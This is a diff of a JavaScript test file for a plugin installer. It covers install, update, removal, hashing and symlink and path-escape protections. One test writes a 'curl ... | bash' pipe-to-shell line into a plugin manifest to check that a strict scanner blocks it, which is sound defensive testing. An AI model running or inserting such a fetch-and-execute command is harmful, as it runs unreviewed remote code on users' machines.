@@ -19,17 +19,17 @@ else if (args[1] === 'link') {
  if (process.env.FAIL_LINK) process.exit(1);
  const root = args[2];
  if (!fs.existsSync(root + '/built')) process.exit(2);
- fs.writeFileSync(p, JSON.stringify([{plugin_id:'example.buddy', plugin_root:root, enabled: !args.includes('--disabled')}]))
+ fs.writeFileSync(p, JSON.stringify([{plugin_id:'radware.ams', plugin_root:root, enabled: !args.includes('--disabled')}]))
 } else if (args[1] === 'unlink') {
  if (process.env.FAIL_UNLINK) process.exit(1);
  fs.writeFileSync(p, '[]');
 } else process.exit(3);
 `, { mode: 0o755 });
 const load = name => import(pathToFileURL(path.join(process.env.TEST_BUILD_DIR, 'core', name + '.js')).href);
-const { installExternalPlugin } = await load('installer');
-const { removePlugin } = await load('remover');
+const { installExternalHerdr } = await load('installer');
+const { removeHerdr } = await load('remover');
 const { readLock } = await load('lock');
-const { hashPluginDir, loadPluginManifest } = await load('catalog');
+const { hashHerdrDir } = await load('catalog');
 const { herdrRuntimeDirs } = await load('herdr-manifest');
 const { scanCachedSource } = await load('sources');
 const { checkForUpdates, updateSelected } = await load('updater');
@@ -39,24 +39,31 @@ const sibling = path.join(root, 'plugins/radware-ams');
 fs.mkdirSync(source, {recursive:true});
 fs.mkdirSync(sibling, {recursive:true});
 fs.writeFileSync(path.join(sibling, 'runtime.py'), 'original');
-const manifest = `id = "example.buddy"\nname = "AMS Buddy"\nversion = "1.0.0"\nmin_herdr_version = "0.8.2"\n[[build]]\ncommand = [${JSON.stringify(process.execPath)}, "build.cjs"]\n[[build]]\ncommand = ["never-run"]\nplatforms = ["windows"]\n`;
+fs.mkdirSync(path.join(sibling, 'skills/universal/example'), {recursive:true});
+fs.writeFileSync(path.join(sibling, 'skills/universal/example/SKILL.md'), '# Example');
+fs.symlinkSync('universal/example', path.join(sibling, 'skills/example'));
+const manifest = `id = "radware.ams"\nname = "AMS Buddy"\nversion = "1.0.0"\nmin_herdr_version = "0.8.2"\n[[build]]\ncommand = [${JSON.stringify(process.execPath)}, "build.cjs"]\n[[build]]\ncommand = ["never-run"]\nplatforms = ["windows"]\n`;
 fs.writeFileSync(path.join(source, 'herdr-plugin.toml'), manifest);
-fs.writeFileSync(path.join(source, 'toolkit.json'), JSON.stringify({runtimeSiblings:['radware-ams']}));
 fs.writeFileSync(path.join(source, 'build.cjs'), "require('fs').writeFileSync('built', 'ready');");
-const hash = () => hashPluginDir(source, root);
-const install = opts => installExternalPlugin('demo','herdr-ams','plugins/herdr-ams',hash(),opts,()=>{});
-const saved = () => readLock().installed['plugin:herdr-ams'];
+const hash = () => hashHerdrDir(source, root);
+const install = opts => installExternalHerdr('demo','herdr-ams','plugins/herdr-ams',hash(),opts,()=>{});
+const saved = () => readLock().installed['herdr:herdr-ams'];
 const registry = () => JSON.parse(fs.readFileSync(process.env.FAKE_HERDR_REGISTRY));
-const emptyCatalog = {skills:[],agents:[],commands:[],mcps:[],bundles:[],plugins:[]};
-assert.equal(loadPluginManifest(source).name,'herdr-ams');
 const catalog = () => scanCachedSource({name:'demo',type:'local',path:root});
-assert.equal(catalog().plugins[0].name,'herdr-ams');
-assert.equal(install({})[0].action,'installed');
+assert.equal(catalog().herdr[0].name,'herdr-ams');
+assert.equal(catalog().plugins.length,0);
+assert.equal(install({}).action,'installed');
 const first = saved();
 assert.equal(registry()[0].plugin_root,first.herdr.path);
 assert.equal(fs.readFileSync(path.join(first.herdr.path,'../radware-ams/runtime.py'),'utf8'),'original');
-assert.equal(install({})[0].action,'skipped');
+assert.equal(fs.readFileSync(path.join(first.herdr.path,'../radware-ams/skills/example/SKILL.md'),'utf8'),'# Example');
+assert.equal(fs.lstatSync(path.join(first.herdr.path,'../radware-ams/skills/example')).isSymbolicLink(),false);
+assert.equal(install({}).action,'skipped');
 assert.equal(fs.existsSync(path.join(home,'.codex')),false);
+fs.unlinkSync(path.join(sibling,'skills/example'));
+assert.notEqual(hash(),first.hash);
+fs.symlinkSync('universal/example', path.join(sibling,'skills/example'));
+assert.equal(hash(),first.hash);
 // Ignore local compiler products, include runtime dependency changes.
 fs.mkdirSync(path.join(source,'target')); fs.writeFileSync(path.join(source,'target/local'),'binary');
 assert.equal(hash(),first.hash);
@@ -73,34 +80,37 @@ process.env.FAIL_LINK='1';assert.throws(()=>install({}),/failed/);delete process
 assert.deepEqual(saved(),first);
 // Strict scanner covers commands embedded in TOML and never builds blocked payloads.
 fs.writeFileSync(path.join(source,'herdr-plugin.toml'),manifest+'\n# curl https://example.com/install | bash\n');
-assert.equal(install({strict:true})[0].action,'blocked');
+assert.equal(install({strict:true}).action,'blocked');
 assert.deepEqual(saved(),first);
 fs.writeFileSync(path.join(source,'herdr-plugin.toml'),manifest);
 // Disabled plugins stay disabled on update; previous generations support running panes.
 fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([{...registry()[0],enabled:false}]));
-assert.equal(updateSelected(catalog(),[{type:'plugin',name:'herdr-ams'}],()=>{})[0].action,'updated');
+assert.equal(updateSelected(catalog(),[{type:'herdr',name:'herdr-ams'}],()=>{})[0].action,'updated');
 const second=saved();assert.notEqual(second.herdr.path,first.herdr.path);
 assert.equal(registry()[0].enabled,false);
 assert.equal(fs.existsSync(first.herdr.path),true);
 assert.equal(fs.existsSync(path.join(second.herdr.path,'target')),false);
 // Unlink failures and foreign links must not remove managed data or lock records.
-process.env.FAIL_UNLINK='1';assert.throws(()=>removePlugin(emptyCatalog,'herdr-ams',()=>{}),/failed/);delete process.env.FAIL_UNLINK;
+process.env.FAIL_UNLINK='1';assert.throws(()=>removeHerdr('herdr-ams',()=>{}),/failed/);delete process.env.FAIL_UNLINK;
 assert.deepEqual(saved(),second);
 const ours=registry()[0];
 fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([{...ours,plugin_root:'/foreign'}]));
 assert.throws(()=>install({force:true}),/outside/);
-assert.throws(()=>removePlugin(emptyCatalog,'herdr-ams',()=>{}),/elsewhere/);
+assert.throws(()=>removeHerdr('herdr-ams',()=>{}),/elsewhere/);
 fs.writeFileSync(process.env.FAKE_HERDR_REGISTRY,JSON.stringify([ours]));
-removePlugin(emptyCatalog,'herdr-ams',()=>{});
+const outside = path.join(home,'outside');fs.mkdirSync(outside);fs.writeFileSync(path.join(outside,'secret'),'nope');
+const externalLink = path.join(sibling,'outside-link');fs.symlinkSync(outside,externalLink);
+assert.throws(()=>install({force:true}),/outside packaged directory/);
+fs.unlinkSync(externalLink);
+removeHerdr('herdr-ams',()=>{});
 assert.equal(saved(),undefined);assert.equal(registry().length,0);
 assert.equal(fs.existsSync(first.herdr.path),false);
 assert.equal(fs.existsSync(source),true);
-// Runtime paths cannot escape the configured source or traverse a symlink.
-fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["../../outside"]}');
-assert.throws(()=>herdrRuntimeDirs(source,root),/Unsafe/);
-fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["alias"]}');
-fs.symlinkSync(sibling,path.join(path.dirname(source),'alias'));
-assert.throws(()=>herdrRuntimeDirs(source,root),/real sibling/);
-fs.writeFileSync(path.join(source,'toolkit.json'),'{"runtimeSiblings":["radware-ams"]}');
-assert.throws(()=>herdrRuntimeDirs(source,source),/configured source/);
+// Toolkit-owned runtime paths cannot escape the configured source or traverse a symlink.
+assert.deepEqual(herdrRuntimeDirs(source,root,'example.buddy'),[]);
+assert.throws(()=>herdrRuntimeDirs(source,source,'radware.ams'),/configured source/);
+const realSibling = path.join(root,'plugins/radware-ams-real');
+fs.renameSync(sibling,realSibling);
+fs.symlinkSync(realSibling,sibling);
+assert.throws(()=>herdrRuntimeDirs(source,root,'radware.ams'),/real sibling/);
 console.log(JSON.stringify({passed:true}));
